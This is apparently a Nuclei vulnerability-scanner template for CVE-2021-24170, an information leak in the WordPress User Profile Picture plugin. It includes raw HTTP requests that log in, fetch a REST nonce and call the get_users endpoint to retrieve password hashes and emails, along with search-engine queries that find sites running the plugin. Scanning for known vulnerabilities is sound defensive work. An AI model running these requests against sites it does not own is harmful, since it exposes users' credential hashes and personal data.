flow: http(1) && http(2) && http(3)
http:
- matchers:
  - condition: and
    dsl:
    - len(body)==0
    - status_code == 302
    - contains_all(header, "wordpress_logged_in_")
    internal: true
    type: dsl
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
- extractors:
  - internal: true
    name: nonce
    part: body
    regex:
    - '[a-z0-9]{10}'
    type: regex
  raw:
  - 'POST /wp-admin/admin-ajax.php?action=rest-nonce HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    '
- matchers:
  - condition: and
    dsl:
    - contains_all(body, "ID", "user_login", "user_pass")
    - contains(content_type, "application/json")
    - status_code == 200
    type: dsl
  raw:
  - 'POST /index.php?rest_route=/mpp/v2/get_users HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    X-WP-Nonce: {{nonce}}

    '
id: CVE-2021-24170
info:
  author: s4e-io
  classification:
    cpe: cpe:2.3:a:cozmoslabs:user_profile_picture:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2021-24170
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-200
    epss-percentile: 0.96365
    epss-score: 0.28674
  description: 'The REST API endpoint get_users in the User Profile Picture WordPress
    plugin before 2.5.0 returned more information than was required for its functionality
    to users with the upload_files capability. This included password hashes, hashed
    user activation keys, usernames, emails, and other less sensitive information.

    '
  impact: 'Authenticated users with upload_files capability can extract sensitive
    user information including password hashes, activation keys, usernames, and email
    addresses via REST API endpoint.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/metronet-profile-picture"
    framework: wordpress
    product: user_profile_picture
    publicwww-query: /wp-content/plugins/metronet-profile-picture
    vendor: cozmoslabs
  name: User Profile Picture < 2.5.0 - Sensitive Information Disclosure
  reference:
  - https://www.wordfence.com/blog/2021/03/medium-severity-vulnerability-patched-in-user-profile-picture-plugin/
  - https://wpscan.com/vulnerability/29fc5b0e-0a5f-4484-a1e6-a0a1206726cc/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-24170
  remediation: 'Update to User Profile Picture version 2.5.0 or later.

    '
  severity: high
  tags: cve,cve2021,wp,wp-plugin,wpscan,wordpress,info-leak,authenticated,metronet-profile-picture,vkev,vuln
